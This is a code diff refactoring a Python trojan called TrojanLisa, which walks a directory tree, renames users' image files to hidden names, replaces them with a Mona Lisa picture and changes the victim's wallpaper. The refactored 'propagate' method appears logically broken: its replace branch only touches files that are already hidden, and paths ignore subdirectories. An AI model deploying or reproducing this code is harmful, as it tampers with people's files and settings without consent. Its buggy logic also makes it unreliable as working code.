@@ -41,10 +41,10 @@ class TrojanLisa:
     def execute(self, command):
         if command == "1":
             print("Replacing images with Mona Lisa...")
-            self.replace_images(os.curdir)
+            self.propagate(restore=False)
         elif command == "2":
             print("Restoring original images...")
-            self.restore_images(os.curdir)
+            self.propagate(restore=True)
         elif command == "3":
             if sys.platform != "win32":
                 return False
@@ -58,33 +58,35 @@ class TrojanLisa:
             return False
         return True
 
-    """ Replace images within a specified directory and all its children """
-    def replace_images(self, root_dir):
-        rootdir = os.curdir + os.sep
-        for subdir, dirs, files in os.walk(os.curdir):
-            for file in files:
-                if file.endswith(self.filetype) and not file.startswith(self.extension):
-                    src = os.path.join(os.curdir, file)
-                    tmp_file = os.path.join(os.curdir, self.extension + file)
-                    if not os.path.isfile(tmp_file):
-                        print("Overwriting", file)
-                        hidden_file = self.extension + file
-                        dst = os.path.join(os.curdir, hidden_file)
-                        os.rename(src, dst)
-                        shutil.copyfile(self.wallpaper, src)
-                    else:
-                        print("Already overwrote", file)
+    """ Replace an image with a copy of Mona Lisa """
+    def replace_image(self, file):
+        src = os.path.join(os.curdir, file)
+        tmp_file = os.path.join(os.curdir, self.extension + file)
+        if not os.path.isfile(tmp_file):
+            print("Overwriting", file)
+            hidden_file = self.extension + file
+            dst = os.path.join(os.curdir, hidden_file)
+            os.rename(src, dst)
+            shutil.copyfile(self.wallpaper, src)
+        else:
+            print("Already overwrote", file)
+    
+    """ Restore an image to its original state """
+    def restore_image(self, file):
+        original_name = file[3:]
+        src = os.path.join(os.curdir, file)
+        dst = os.path.join(os.curdir, original_name)
+        os.replace(src, dst)
 
-    """ Restore images to original state within a specified directory and all its children """
-    def restore_images(self, root_dir):
-        rootdir = os.curdir + os.sep
+    """ Traverse and propagate through the file system """
+    def propagate(self, restore=False):
         for subdir, dirs, files in os.walk(os.curdir):
             for file in files:
                 if file.endswith(self.filetype) and file.startswith(self.extension):
-                    original_name = file[3:]
-                    src = os.path.join(os.curdir, file)
-                    dst = os.path.join(os.curdir, original_name)
-                    os.replace(src, dst)
+                    if restore:
+                        self.restore_image(file)
+                    else:
+                        self.replace_image(file)
 
     """ Changes target's wallpaper to Mona Lisa """
     def change_wallpaper(self):
